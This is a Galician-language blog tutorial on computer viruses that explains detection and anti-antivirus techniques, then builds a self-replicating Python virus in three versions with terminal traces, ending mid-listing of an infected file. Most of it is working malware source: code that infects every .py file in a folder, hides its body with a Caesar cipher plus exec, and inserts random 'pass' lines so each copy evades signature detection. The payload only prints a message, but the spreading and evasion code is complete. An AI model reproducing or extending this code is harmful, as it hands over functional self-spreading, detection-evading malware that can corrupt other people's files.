---
title: Virus e Python
author: Guzmán Cernadas Pérez
date: 2020-12-14
tags: ["python", "malware", "obfuscation"]
---

Nesta publicación explicarase varias cuestións a hora de entender como funciona un virus. Primeiro explicaranse que son 
e como é o seu ciclo de vida. A continuación, esbozaranse as principais técnicas para detectar un virus. Despois, 
comentaranse as principais técnicas anti-antivirus. Logo, explicarase como funciona un virus aportando exemplos de 
código, para finalmente, engadir varias melloras e proteccións para que non se poida detectar mediante sinatura.

Advertencia: a finalidade desta publicación é educativa. En ningún caso os membros de Hackliza se farán responsables do 
que se faga con este código.

# Que é un virus?
Un virus é un programa capaz de copiarse a si mesmo a outros arquivos.

O ciclo de vida dun virus, normalmente, consta de tres fases:
- Infección: nesta fase o virus espallase polo sistema, buscando posibles ficheiros para reproducirse e finalmente 
  copiarse. Existen dous tipos de infección:
  - Pasiva: o usuario dun sistema copia o virus dalgún lado e execútao.
  - Activa: o virus explota algunha vulnerabilidade para infectar o sistema.
- Incubación: nesta fase o virus busca manterse no sistema o maior tempo posible.
- Enfermidade: nesta fase é cando se realizan as accións non desexadas polo usuario.

# Como se detecta un virus?
Á hora de detectar un virus, utilízanse varias técnicas:

**Técnicas estáticas**. Estas técnicas examinan os arquivos infectados ou orixinais sen executar o código. Algúns 
exemplos destas técnicas son:
- Busca de sinaturas víricas: consiste en crear unha firma dunha característica propia do virus e buscala. A 
  característica pode ser unha cadea de caracteres, unha secuencia de instrucións ou unha marca usada polo mecanismo de 
  detección do virus.
- Análise espectral: consiste en buscar instrucións sospeitosas utilizadas por outro software malicioso. Por exemplo, 
  unha instrución sospeitosa sería “a = a + 0”, a cal non modifica o comportamento do virus, pero pode ser utilizada 
  para modificar a sinatura deste.
- Análise heurístico: consiste en analizar o comportamento dun programa, para detectar posibles accións maliciosas.

**Técnicas dinámicas**. Estas técnicas executan o código sospeitoso e deciden se é un malware ou non en base ao 
comportamento observado. Algunhas destas técnicas son:
- Seguimento de comportamentos: o antivirus residente en memoria, intentará detectar calquera actividade sospeitosa e 
  parala. Para observar o comportamento dun programa en Linux, o antivirus fará un seguimento das chamadas realizadas 
  as interrupcións 13H e 21H. Para Windows, farase un seguimento das chamadas realizadas á API do sistema operativo.
- Emulación de código (Sandboxing): o programa sospeitoso é executado nun sistema emulado para ver o seu comportamento.

**Comprobación da integridade dos arquivos**. Nesta técnica comprobase se se modificou un arquivo comprobando o hash 
cada certo tempo.

# Técnicas anti-antivirus
Este tipo de técnicas empréganse para evitar que un antivirus detecte un código malicioso. Algunhas delas son:

**Técnicas de sixilo**: son un conxunto de técnicas cuxo obxectivo é convencer ao usuario de que non está pasando nada 
malo. Algún exemplo destas técnicas son:
- Hooking de interrupcións ou chamadas realizadas á API de Windows.
- Borrar o seu propio executable.
- Detección dunha sandbox para non executarse.

**Polimorfismo**: son técnicas encamiñadas a evitar a detección por sinatura. Este tipo de técnicas fan que se 
reescriba o código do programa (neste tipo de modificacións non se cambia o comportamento do virus, se non que se 
engaden instrucións lixo coma por exemplo, NOP ou add eax, 0) ou que se cifren partes deste.

**Metamorfismo**: son técnicas encamiñadas a evitar a detección por sinatura e a detección por comportamento. Este tipo 
de técnicas fan que se reescriba o código do programa cambiando as súas funcionalidades. Algunhas técnicas de 
metamorfismo son:
- Dividir unha instrución en dúas ou máis.
- Converter dúas instrucións nunha soa.
- Adición de código morto.

**Outras técnicas máis intrusivas** son: matar o proceso do antivirus, desinstalar o antivirus ou corromper a base de 
datos de sinaturas do antivirus.

# Creación e funcionamento dun virus
Para ensinar como funciona un virus utilizarase Python coma linguaxe de programación. Esta linguaxe foi escollida pola 
pouca complexidade que se ten á hora de crear e ler código.

Nota: ningún dos virus ensinados nesta publicación conterá unha función maliciosa con fin de evitar estragos. Tamén hai 
que destacar que en todas as funcións de infección presentadas só se contempla o directorio dende onde se executa o 
virus.

## Creando un virus
O virus que se presenta a continuación terá a funcionalidades de autoreplicarse e mostrar pola pantalla unha mensaxe 
cando se termina o proceso de infección. Outra característica é que o virus escríbese no principio de cada arquivo 
infectado, facendo que, se se executa un arquivo que conteña o virus, se execute o código malicioso antes ca o código 
lexítimo.

Sen máis preámbulos disponse a explicar que fan cada unha das partes do virus:

 - Función **infectar**: esta función busca posibles arquivos para infectar no cartafol onde se executa o virus. Unha 
   vez atopado un candidato, comproba se xa está infectado previamente. Se non o está, crearase un novo ficheiro que 
   conterá o virus e o código do candidato.
```python
def infectar(virus):
    ruta = "."
    for arquivo in os.listdir(ruta):
        if arquivo.endswith(".py"):
            script = open(arquivo, "r")
            texto_script = script.read()
            script.close()
            if not "# Virus:Inicio" in texto_script:
                infectado = open(arquivo + ".infectado", "w")
                infectado.write(virus + "\n")
                infectado.write(texto_script)
                infectado.close()
                os.remove(arquivo)
                os.rename(arquivo + ".infectado", arquivo)
```

- Función **payload**: esta función contería o código malicioso. Neste caso só imprime pola pantalla a mensaxe 
  “Fuches infectado”.
```python
def payload():
    print("Fuches infectado")
```

- Función **executa**: esta función chama as funcións de infectar e payload.
```python
def executa(virus):
    infectar(virus)
    payload()
```

- **Código global**: Este código lee o arquivo que se está a executar, extrae o código do virus e chama á función 
  executa.
```python
portador = open(sys.argv[0], "r")
texto_portador = portador.read()
portador.close()
virus = texto_portador[texto_portador.find("# Virus:Inicio"):texto_portador.rfind("# Virus:Fin") + len("# Virus:Fin")]
executa(virus)
```

O código do virus atópase situado entre dous comentarios: #Virus:Inicio e #Virus:Fin. Con estes comentarios pretendese 
coñecer a localización do código vírico en calquera arquivo (tanto os infectados coma o orixinal).

Unha vez explicadas polo miúdo as funcións do virus, o código final deste é o seguinte:

```python
# Virus:Inicio
import os
import sys


def infectar(virus):
    ruta = "."
    for arquivo in os.listdir(ruta):
        if arquivo.endswith(".py"):
            script = open(arquivo, "r")
            texto_script = script.read()
            script.close()
            if not "# Virus:Inicio" in texto_script:
                infectado = open(arquivo + ".infectado", "w")
                infectado.write(virus + "\n")
                infectado.write(texto_script)
                infectado.close()
                os.remove(arquivo)
                os.rename(arquivo + ".infectado", arquivo)


def payload():
    print("Fuches infectado")


def executa(virus):
    infectar(virus)
    payload()


portador = open(sys.argv[0], "r")
texto_portador = portador.read()
portador.close()
virus = texto_portador[texto_portador.find("# Virus:Inicio"):texto_portador.rfind("# Virus:Fin") + len("# Virus:Fin")]
executa(virus)
# Virus:Fin
```

Se se executa este código nun cartafol con outros ficheiros coa extensión .py, obterase o seguinte resultado:
```shell
probasvx@probasvx:~/virus1$ ls -las
total 16
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec 14 11:12 .
4 drwxr-xr-x 23 probasvx probasvx 4096 Dec 14 11:05 ..
4 -rw-r--r--  1 probasvx probasvx   20 Dec 14 11:12 Ola.py
4 -rw-r--r--  1 probasvx probasvx  925 Dec 14 11:11 virus.py
probasvx@probasvx:~/virus1$ cat Ola.py 
print("Ola mundo!")
probasvx@probasvx:~/virus1$ python3 virus.py 
Fuches infectado
probasvx@probasvx:~/virus1$ ls -las
total 16
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec 14 11:12 .
4 drwxr-xr-x 23 probasvx probasvx 4096 Dec 14 11:05 ..
4 -rw-r--r--  1 probasvx probasvx  945 Dec 14 11:12 Ola.py
4 -rw-r--r--  1 probasvx probasvx  925 Dec 14 11:11 virus.py
probasvx@probasvx:~/virus1$ cat Ola.py 
# Virus:Inicio
import os
import sys


def infectar(virus):
    ruta = "."
    for arquivo in os.listdir(ruta):
        if arquivo.endswith(".py"):
            script = open(arquivo, "r")
            texto_script = script.read()
            script.close()
            if not "# Virus:Inicio" in texto_script:
                infectado = open(arquivo + ".infectado", "w")
                infectado.write(virus + "\n")
                infectado.write(texto_script)
                infectado.close()
                os.remove(arquivo)
                os.rename(arquivo + ".infectado", arquivo)


def payload():
    print("Fuches infectado")


def executa(virus):
    infectar(virus)
    payload()


portador = open(sys.argv[0], "r")
texto_portador = portador.read()
portador.close()
virus = texto_portador[texto_portador.find("# Virus:Inicio"):texto_portador.rfind("# Virus:Fin") + len("# Virus:Fin")]
executa(virus)
# Virus:Fin
print("Ola mundo!")
```

Nesta traza pódese ver como despois da execución do virus, o arquivo Ola.py aumentou de tamaño, xa que agora contén o 
código do virus.

A principal debilidade deste virus é que o código está contido entre os comentarios “#Virus:Inicio” e “#Virus:Fin”. Con 
este dato un antivirus é capaz de detectar e eliminar o código de forma trivial. Por outro lado, coma o código é sempre 
o mesmo, pódese utilizar como firma do virus para a detección.

## Corrixindo debilidades
En vista das debilidades que ten o virus anterior, a continuación engadirase unha protección a cal será cifrar o código 
para que, por un lado o cifrado sexa diferente despois de cada infección (e polo tanto a firma do código tamén) e por 
outro para que aos analistas lles sexa máis complicado saber que fai o código. Outra cousa que cambia é que neste virus 
deixarase de utilizar os comentarios “#Virus:Inicio” e “#Virus:Fin” xa que son unha evidencia do propio virus. Por 
último, os arquivos infectados terán o código do virus ao final en vez de ao principio.

O malware que se presenta a continuación será un **xerme**, isto é un programa en texto claro que xerará un virus 
(neste caso cunha parte cifrada). Este xerme conterá unha función para cifrar e outra para descifrar o código, tamén 
contará cunha función para o cálculo da clave coa que se cifran os datos. 

As diferentes partes do xerme que se creará son as seguintes:
- Función **calcula_clave**: esta función calcula a clave de cifrado a partir das primeiras letras dun arquivo. En caso 
  de que o arquivo conteña menos de 3 letras a clave devolta é 42.
```python
def calcula_clave(texto):
    if len(texto) >= 3:
        clave = ord(texto[0]) + ord(texto[1]) + ord(texto[2])
    else:
        clave = 42
    return clave
```

- Función **descifra**: esta función descifra un texto cifrado co cifrado Cesar. 
```python
def descifra(texto, clave):
    texto_descifrado = ""
    for caracter in texto:
        if caracter.isupper():
            texto_descifrado += chr((ord(caracter) - clave - 65) % 26 + 65)
        elif caracter.islower():
            texto_descifrado += chr((ord(caracter) - clave - 97) % 26 + 97)
        else:
            texto_descifrado += caracter
    return texto_descifrado
```

- Función **cifra**: esta función cifra un texto co cifrado Cesar.
```python
def cifra(texto, clave):
    texto_cifrado = ""
    for caracter in texto:
        if caracter.isupper():
            texto_cifrado += chr((ord(caracter) + clave - 65) % 26 + 65)
        elif caracter.islower():
            texto_cifrado += chr((ord(caracter) + clave - 97) % 26 + 97)
        else:
            texto_cifrado += caracter
    return texto_cifrado
```

Nota: as funcións de cifrado e descifrado, só modificarán as maiúsculas e minúsculas. O resto de caracteres déixanos 
igual.

- Función **infectar**: esta función busca no cartafol dende onde se executa o virus arquivos que teñan a extensión .py 
  para infectalos. Se existe algún arquivo que teña esta extensión, abrirase o arquivo e comprobarase se contén a cadea 
  de caracteres “del calcula_clave”, se non a ten, faranse as seguintes accións:
  - Cifraranse as funcións “cifra”, “infectar”, “payload” e “executa”.
  - Engadiranse as funcións calcula_clave e descifra ao arquivo a infectar.
  - Crearase un código para descifrar o texto cifrado.
  - Engadiranse o código cifrado e o código para descifralo ao final do arquivo a infectar.
```python
def infectar(virus):
    import os
    for arquivo in os.listdir("."):
        if arquivo.endswith(".py"):
            script = open(arquivo, "r+")
            texto_script = script.read()
            if "def calcula_clave" not in texto_script:
                parte_en_claro = virus[:541]
                parte_a_cifrar = virus[541:]
                clave = calcula_clave(texto_script)
                parte_crifrada = cifra(parte_a_cifrar, clave)
                script.write(parte_en_claro)
                descrifrador = "import sys" + chr(10) + "portador = open(sys.argv[0], " + chr(34) + "r" + chr(34) + ")" + chr(10) + "texto_portador = portador.read()" + chr(10) + "portador.close()" + chr(10) + "parte_sin_cifrar = texto_portador[texto_portador.find(" + chr(34) + "def calcula_clave" + chr(34) + "):texto_portador.find(" + chr(34) + "def calcula_clave" + chr(34) + ")+541]" + chr(10) + "clave = calcula_clave(texto_portador)" + chr(10) + "texto_descifrado = descifra(" + chr(34) + chr(34) + chr(34) + parte_crifrada + chr(34) + chr(34) + chr(34) + ", clave)" + chr(10) + "exec(texto_descifrado)" + chr(10) + "executa(parte_sin_cifrar + texto_descifrado)"
                script.write(descrifrador)
            script.close()
```

- Código da variable **descifrador**: este é o código que se utiliza para descifrar o contido cifrado do virus despois 
  da primeira infección.
```python
import sys
portador = open(sys.argv[0], "r")
texto_portador = portador.read()
portador.close()
parte_sin_cifrar = texto_portador[texto_portador.find("def calcula_clave"):texto_portador.find("def calcula_clave")+541]
clave = calcula_clave(texto_portador)
texto_descifrado = descifra("""
wxy vbykt(mxqmh, vetox):
    mxqmh_vbyktwh = ""
    yhk vtktvmxk bg mxqmh:

***

wxy xqxvnmt(obknl):
    bgyxvmtk(obknl)
    itrehtw()

""", clave)
exec(texto_descifrado)
executa(parte_sin_cifrar + texto_descifrado)
```

- Función **payload**: esta función contería o código malicioso. Neste caso só imprime pola pantalla a mensaxe 
  “Fuches infectado”.
```python
def payload():
    print("Fuches infectado")
```

- Función **executa**: chama as funciona de infectar e payload.
```python
def executa(virus):
    infectar(virus)
    payload()
```

- **Código global**: Este código lee o código do xerme, quédase co resto coas funcións explicadas anteriormente e 
  executa o virus.
```python
import sys
portador = open(sys.argv[0], "r")
texto_portador = portador.read()
portador.close()
virus = texto_portador[:2244]
executa(virus)
```

Despois de explicar todas as funcións, o código completo do xerme é o seguinte:
```python
def calcula_clave(texto):
    if len(texto) >= 3:
        clave = ord(texto[0]) + ord(texto[1]) + ord(texto[2])
    else:
        clave = 42
    return clave


def descifra(texto, clave):
    texto_descifrado = ""
    for caracter in texto:
        if caracter.isupper():
            texto_descifrado += chr((ord(caracter) - clave - 65) % 26 + 65)
        elif caracter.islower():
            texto_descifrado += chr((ord(caracter) - clave - 97) % 26 + 97)
        else:
            texto_descifrado += caracter
    return texto_descifrado


def cifra(texto, clave):
    texto_cifrado = ""
    for caracter in texto:
        if caracter.isupper():
            texto_cifrado += chr((ord(caracter) + clave - 65) % 26 + 65)
        elif caracter.islower():
            texto_cifrado += chr((ord(caracter) + clave - 97) % 26 + 97)
        else:
            texto_cifrado += caracter
    return texto_cifrado


def infectar(virus):
    import os
    for arquivo in os.listdir("."):
        if arquivo.endswith(".py"):
            script = open(arquivo, "r+")
            texto_script = script.read()
            if "def calcula_clave" not in texto_script:
                parte_en_claro = virus[:541]
                parte_a_cifrar = virus[541:]
                clave = calcula_clave(texto_script)
                parte_crifrada = cifra(parte_a_cifrar, clave)
                script.write(parte_en_claro)
                descrifrador = "import sys" + chr(10) + "portador = open(sys.argv[0], " + chr(34) + "r" + chr(34) + ")" + chr(10) + "texto_portador = portador.read()" + chr(10) + "portador.close()" + chr(10) + "parte_sin_cifrar = texto_portador[texto_portador.find(" + chr(34) + "def calcula_clave" + chr(34) + "):texto_portador.find(" + chr(34) + "def calcula_clave" + chr(34) + ")+541]" + chr(10) + "clave = calcula_clave(texto_portador)" + chr(10) + "texto_descifrado = descifra(" + chr(34) + chr(34) + chr(34) + parte_crifrada + chr(34) + chr(34) + chr(34) + ", clave)" + chr(10) + "exec(texto_descifrado)" + chr(10) + "executa(parte_sin_cifrar + texto_descifrado)"
                script.write(descrifrador)
            script.close()


def payload():
    print("Fuches infectado")


def executa(virus):
    infectar(virus)
    payload()


import sys
portador = open(sys.argv[0], "r")
texto_portador = portador.read()
portador.close()
virus = texto_portador[:2244]
executa(virus)
```

Se executamos este código nun cartafol con onde se atope algún outro ficheiro cuxa extensión é .py obterase a seguinte 
traza:
```shell
probasvx@probasvx:~/virus2$ ls -las
total 16
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec  9 15:59 .
4 drwxr-xr-x 21 probasvx probasvx 4096 Dec  9 12:04 ..
4 -rw-r--r--  1 probasvx probasvx   20 Dec  9 15:59 Ola.py
4 -rw-r--r--  1 probasvx probasvx 2385 Dec  9 15:59 virus.py
probasvx@probasvx:~/virus2$ cat Ola.py 
print("Ola mundo!")
probasvx@probasvx:~/virus2$ python3 virus.py 
Fuches infectado
probasvx@probasvx:~/virus2$ ls -las
total 16
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec  9 15:59 .
4 drwxr-xr-x 21 probasvx probasvx 4096 Dec  9 12:04 ..
4 -rw-r--r--  1 probasvx probasvx 2628 Dec  9 16:00 Ola.py
4 -rw-r--r--  1 probasvx probasvx 2385 Dec  9 15:59 virus.py
```

Nesta traza pódese ver que o ficheiro Ola.py aumentou de tamaño. O contido que contén despois da execución do virus é o 
seguinte:
```python
print("Ola mundo!")
def calcula_clave(texto):
    if len(texto) >= 3:
        clave = ord(texto[0]) + ord(texto[1]) + ord(texto[2])
    else:
        clave = 42
    return clave


def descifra(texto, clave):
    texto_descifrado = ""
    for caracter in texto:
        if caracter.isupper():
            texto_descifrado += chr((ord(caracter) - clave - 65) % 26 + 65)
        elif caracter.islower():
            texto_descifrado += chr((ord(caracter) - clave - 97) % 26 + 97)
        else:
            texto_descifrado += caracter
    return texto_descifrado

import sys
portador = open(sys.argv[0], "r")
texto_portador = portador.read()
portador.close()
parte_sin_cifrar = texto_portador[texto_portador.find("def calcula_clave"):texto_portador.find("def calcula_clave")+541]
clave = calcula_clave(texto_portador)
texto_descifrado = descifra("""
wxy vbykt(mxqmh, vetox):
    mxqmh_vbyktwh = ""
    yhk vtktvmxk bg mxqmh:
        by vtktvmxk.blniixk():
            mxqmh_vbyktwh += vak((hkw(vtktvmxk) + vetox - 65) % 26 + 65)
        xeby vtktvmxk.blehpxk():
            mxqmh_vbyktwh += vak((hkw(vtktvmxk) + vetox - 97) % 26 + 97)
        xelx:
            mxqmh_vbyktwh += vtktvmxk
    kxmnkg mxqmh_vbyktwh


wxy bgyxvmtk(obknl):
    bfihkm hl
    yhk tkjnboh bg hl.eblmwbk("."):
        by tkjnboh.xgwlpbma(".ir"):
            lvkbim = hixg(tkjnboh, "k+")
            mxqmh_lvkbim = lvkbim.kxtw()
            by "wxy vtevnet_vetox" ghm bg mxqmh_lvkbim:
                itkmx_xg_vetkh = obknl[:541]
                itkmx_t_vbyktk = obknl[541:]
                vetox = vtevnet_vetox(mxqmh_lvkbim)
                itkmx_vkbyktwt = vbykt(itkmx_t_vbyktk, vetox)
                lvkbim.pkbmx(itkmx_xg_vetkh)
                wxlvkbyktwhk = "bfihkm lrl" + vak(10) + "ihkmtwhk = hixg(lrl.tkzo[0], " + vak(34) + "k" + vak(34) + ")" + vak(10) + "mxqmh_ihkmtwhk = ihkmtwhk.kxtw()" + vak(10) + "ihkmtwhk.vehlx()" + vak(10) + "itkmx_lbg_vbyktk = mxqmh_ihkmtwhk[mxqmh_ihkmtwhk.ybgw(" + vak(34) + "wxy vtevnet_vetox" + vak(34) + "):mxqmh_ihkmtwhk.ybgw(" + vak(34) + "wxy vtevnet_vetox" + vak(34) + ")+541]" + vak(10) + "vetox = vtevnet_vetox(mxqmh_ihkmtwhk)" + vak(10) + "mxqmh_wxlvbyktwh = wxlvbykt(" + vak(34) + vak(34) + vak(34) + itkmx_vkbyktwt + vak(34) + vak(34) + vak(34) + ", vetox)" + vak(10) + "xqxv(mxqmh_wxlvbyktwh)" + vak(10) + "xqxvnmt(itkmx_lbg_vbyktk + mxqmh_wxlvbyktwh)"
                lvkbim.pkbmx(wxlvkbyktwhk)
            lvkbim.vehlx()


wxy itrehtw():
    ikbgm("Ynvaxl bgyxvmtwh")


wxy xqxvnmt(obknl):
    bgyxvmtk(obknl)
    itrehtw()

""", clave)
exec(texto_descifrado)
executa(parte_sin_cifrar + texto_descifrado)
```

No ficheiro infectado pódense ver as seguintes partes:
- O código do anterior programa (o "Ola mundo!").
- As funcións para o cálculo da clave e descifrado.
- O código cifrado xunto coas chamadas as funcións de cálculo da clave e descifrado.
- Chamada a función exec para que Python interprete o código descifrado.

Despois de todos os cambios realizados ao virus inicial segue habendo unha debilidade, este virus pódese detectar polas 
funcións de descifrado e cálculo de clave, xa que estas pódense utilizar como sinatura para a detección do virus. 

Hai que destacar que este virus infecta aos arquivos que non conteñan a cadea de caracteres “def calcula_clave”, polo 
que se nun programa ou script lexítimo existe esa cadea de caracteres, non será infectado.

## Evitando a detección por firma
Nesta nova versión, engadirase a funcionalidade de modificar o código das funcións que non se cifran (calcula_clave e 
descifa) engadindo a palabra reservada “pass” varias veces de forma aleatoria neste código. Hai que dicir que a palabra 
reservada “pass” non ten ningún efecto na funcionalidade das funcións. Cada vez que se execute o virus, os novos 
arquivos infectados poderán ter os “pass” en diferentes posicións. Con esta modificación pretendese que non se utilice 
o código que non se cifra como sinatura do virus.

Para conseguir a funcionalidade descrita engadíronse e modificáronse as seguintes funcións:
- Función **borra_pass**: esta función borra todas as aparicións da palabra reservada “pass” no código que non se cifra.
```python
def borra_pass(codigo):
    codigo_sen_pass = []
    for linha in codigo.split(chr(10)):
        if not "pass" in linha:
            codigo_sen_pass.append(linha)
    return chr(10).join(codigo_sen_pass)
```

- Función **calcula_tabulacion**: esta función calcula o número de espazos que preceden a un “pass” cando se insire.
```python
def calcula_tabulacion(codigo, posicion):
    if "else" in codigo[posicion] or "elif" in codigo[posicion]:
        return len(codigo[posicion]) - len(codigo[posicion].lstrip()) + 4
    return len(codigo[posicion]) - len(codigo[posicion].lstrip())
```

- Función **engade_pass**: esta función é a que coloca aleatoriamente os “pass” no código que non se cifra.
```python
def engade_pass(codigo):
    import random
    linhas = codigo.split(chr(10))
    for i in range(10):
        if random.random() > 0.75:
            posicion_insecion = random.randint(1, len(linhas) - 1)
            linhas.insert(posicion_insecion, " " * calcula_tabulacion(linhas, posicion_insecion) + "pass")
    return chr(10).join(linhas)
```

- Función **modifica**: esta función é a encargada de borrar os “pass” previos e engadir os novos a cada unha das 
  funcións que non se cifran.
```python
def modifica(codigo):
    novo_codigo = []
    separador = chr(10) + chr(10) + chr(10)
    funcions = codigo.split(separador)
    for texto in funcions:
        if texto:
            codigo_sen_pass = borra_pass(texto)
            codigo_con_pass = engade_pass(codigo_sen_pass)
            novo_codigo.append(codigo_con_pass)
        else:
            novo_codigo.append(texto)
    return separador.join(novo_codigo)
```

Función **infectar**: esta función fai o mesmo ca antes, pero agora:
- En vez de obter a parte e claro e a parte a cifrar mediante un valor fixo, obtense buscando a posición da función 
  cifra.
- Chamase a función modifica para que o código que non se cifre sexa diferente.
- O código do descifrador xa non ten o valor fixo para indicar a lonxitude da parte descifrada; agora calculase en 
  función do tamaño do código modificado.
```python
def infectar(virus):
    import os
    for arquivo in os.listdir("."):
        if arquivo.endswith(".py"):
            script = open(arquivo, "r+")
            texto_script = script.read()
            if "def calcula_clave" not in texto_script:
                parte_en_claro = virus[:virus.find("def cifra")]
                parte_a_cifrar = virus[virus.find("def cifra"):]
                parte_en_claro_modificada = modifica(parte_en_claro)
                clave = calcula_clave(texto_script)
                parte_crifrada = cifra(parte_a_cifrar, clave)
                script.write(parte_en_claro_modificada)
                descrifrador = "import sys" + chr(10) + "portador = open(sys.argv[0], " + chr(34) + "r" + chr(34) + ")" + chr(10) + "texto_portador = portador.read()" + chr(10) + "portador.close()" + chr(10) + "parte_sin_cifrar = texto_portador[texto_portador.find(" + chr(34) + "def calcula_clave" + chr(34) + "):texto_portador.find(" + chr(34) + "def calcula_clave" + chr(34) + ")+" + str(len(parte_en_claro_modificada)) + "]" + chr(10) + "clave = calcula_clave(texto_portador)" + chr(10) + "texto_descifrado = descifra(" + chr(34) + chr(34) + chr(34) + parte_crifrada + chr(34) + chr(34) + chr(34) + ", clave)" + chr(10) + "exec(texto_descifrado)" + chr(10) + "executa(parte_sin_cifrar + texto_descifrado)"
                script.write(descrifrador)
            script.close()
```

O resto de funcións do xerme (calcula_clave, descifra, cifra, payload e executa) e código global non se modificaron. 
Dito isto, o código completo deste xerme é o seguinte:
```python
def calcula_clave(texto):
    if len(texto) >= 3:
        clave = ord(texto[0]) + ord(texto[1]) + ord(texto[2])
    else:
        clave = 42
    return clave


def descifra(texto, clave):
    texto_descifrado = ""
    for caracter in texto:
        if caracter.isupper():
            texto_descifrado += chr((ord(caracter) - clave - 65) % 26 + 65)
        elif caracter.islower():
            texto_descifrado += chr((ord(caracter) - clave - 97) % 26 + 97)
        else:
            texto_descifrado += caracter
    return texto_descifrado


def cifra(texto, clave):
    texto_cifrado = ""
    for caracter in texto:
        if caracter.isupper():
            texto_cifrado += chr((ord(caracter) + clave - 65) % 26 + 65)
        elif caracter.islower():
            texto_cifrado += chr((ord(caracter) + clave - 97) % 26 + 97)
        else:
            texto_cifrado += caracter
    return texto_cifrado


def borra_pass(codigo):
    codigo_sen_pass = []
    for linha in codigo.split(chr(10)):
        if not "pass" in linha:
            codigo_sen_pass.append(linha)
    return chr(10).join(codigo_sen_pass)


def calcula_tabulacion(codigo, posicion):
    if "else" in codigo[posicion] or "elif" in codigo[posicion]:
        return len(codigo[posicion]) - len(codigo[posicion].lstrip()) + 4
    return len(codigo[posicion]) - len(codigo[posicion].lstrip())


def engade_pass(codigo):
    import random
    linhas = codigo.split(chr(10))
    for i in range(10):
        if random.random() > 0.75:
            posicion_insecion = random.randint(1, len(linhas) - 1)
            linhas.insert(posicion_insecion, " " * calcula_tabulacion(linhas, posicion_insecion) + "pass")
    return chr(10).join(linhas)


def modifica(codigo):
    novo_codigo = []
    separador = chr(10) + chr(10) + chr(10)
    funcions = codigo.split(separador)
    for texto in funcions:
        if texto:
            codigo_sen_pass = borra_pass(texto)
            codigo_con_pass = engade_pass(codigo_sen_pass)
            novo_codigo.append(codigo_con_pass)
        else:
            novo_codigo.append(texto)
    return separador.join(novo_codigo)


def infectar(virus):
    import os
    for arquivo in os.listdir("."):
        if arquivo.endswith(".py"):
            script = open(arquivo, "r+")
            texto_script = script.read()
            if "def calcula_clave" not in texto_script:
                parte_en_claro = virus[:virus.find("def cifra")]
                parte_a_cifrar = virus[virus.find("def cifra"):]
                parte_en_claro_modificada = modifica(parte_en_claro)
                clave = calcula_clave(texto_script)
                parte_crifrada = cifra(parte_a_cifrar, clave)
                script.write(parte_en_claro_modificada)
                descrifrador = "import sys" + chr(10) + "portador = open(sys.argv[0], " + chr(34) + "r" + chr(34) + ")" + chr(10) + "texto_portador = portador.read()" + chr(10) + "portador.close()" + chr(10) + "parte_sin_cifrar = texto_portador[texto_portador.find(" + chr(34) + "def calcula_clave" + chr(34) + "):texto_portador.find(" + chr(34) + "def calcula_clave" + chr(34) + ")+" + str(len(parte_en_claro_modificada)) + "]" + chr(10) + "clave = calcula_clave(texto_portador)" + chr(10) + "texto_descifrado = descifra(" + chr(34) + chr(34) + chr(34) + parte_crifrada + chr(34) + chr(34) + chr(34) + ", clave)" + chr(10) + "exec(texto_descifrado)" + chr(10) + "executa(parte_sin_cifrar + texto_descifrado)"
                script.write(descrifrador)
            script.close()


def payload():
    print("Fuches infectado")


def executa(virus):
    infectar(virus)
    payload()


import sys
portador = open(sys.argv[0], "r")
texto_portador = portador.read()
portador.close()
virus = texto_portador[:3621]
executa(virus)
```

Se o executamos o xerme nun cartafol con varios arquivos con extensión .py obteremos a seguinte traza:
```shell
probasvx@probasvx:~/virus3$ ls -las
total 20
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec 13 18:26 .
4 drwxr-xr-x 23 probasvx probasvx 4096 Dec 13 17:58 ..
4 -rw-r--r--  1 probasvx probasvx   39 Dec 13 18:26 Ola2.py
4 -rw-r--r--  1 probasvx probasvx   20 Dec 13 17:57 Ola.py
4 -rw-r--r--  1 probasvx probasvx 3764 Dec 13 18:16 virus.py
probasvx@probasvx:~/virus3$ cat Ola.py 
print("Ola mundo!")
probasvx@probasvx:~/virus3$ cat Ola2.py 
# Comentario
print("Ola outra vez :)")
probasvx@probasvx:~/virus3$ python3 virus.py 
Fuches infectado
probasvx@probasvx:~/virus3$ ls -las
total 28
4 drwxr-xr-x  2 probasvx probasvx 4096 Dec 13 18:26 .
4 drwxr-xr-x 23 probasvx probasvx 4096 Dec 13 17:58 ..
8 -rw-r--r--  1 probasvx probasvx 4123 Dec 13 18:27 Ola2.py
8 -rw-r--r--  1 probasvx probasvx 4113 Dec 13 18:27 Ola.py
4 -rw-r--r--  1 probasvx probasvx 3764 Dec 13 18:16 virus.py
```

Na traza pódese observar que o tamaño do ficheiro Ola2.py, antes da execución do virus, tiña 19 bytes máis ca Ola.py. 
Despois da execución do virus, Ola2.py pasou a ter só 10 bytes máis. Isto débese á cantidade e posición de “pass” 
inseridos no código que non se cifra do virus. A continuación móstranse os códigos de cada ficheiro:
```shell
probasvx@probasvx:~/virus3$ cat Ola.py 
print("Ola mundo!")
def calcula_clave(texto):
    pass
    if len(texto) >= 3:
        clave = ord(texto[0]) + ord(texto[1]) + ord(texto[2])
        pass
        pass
        pass
    else:
        clave = 42
    return clave


def descifra(texto, clave):
    texto_descifrado = ""
    for caracter in texto:
        if caracter.isupper():
            texto_descifrado += chr((ord(caracter) - clave - 65) % 26 + 65)
        elif caracter.islower():
            pass
            pass
            pass
            texto_descifrado += chr((ord(caracter) - clave - 97) % 26 + 97)
        else:
            texto_descifrado += caracter
    pass
    return texto_descifrado
```

```shell
probasvx@probasvx:~/virus3$ cat Ola2.py 
# Comentario
print("Ola outra vez :)")
def calcula_clave(texto):
    pass
    pass
    if len(texto) >= 3:
        pass
        clave = ord(texto[0]) + ord(texto[1]) + ord(texto[2])
    else:
        clave = 42
    return clave


def descifra(texto, clave):
    texto_descifrado = ""
    for caracter in texto:
        if caracter.isupper():
            pass
            pass
            pass
            texto_descifrado += chr((ord(caracter) - clave - 65) % 26 + 65)
        elif caracter.islower():
            texto_descifrado += chr((ord(caracter) - clave - 97) % 26 + 97)
        else:
            pass
            texto_descifrado += caracter
    return texto_descifrado
```

O código completo dun arquivo infectado é o seguinte:
```python
print("Ola mundo!")
def calcula_clave(texto):
    pass
    if len(texto) >= 3:
        clave = ord(texto[0]) + ord(texto[1]) + ord(texto[2])
        pass
        pass
        pass
    else:
        clave = 42
    return clave


def descifra(texto, clave):
    texto_descifrado = ""
    for caracter in texto:
        if caracter.isupper():
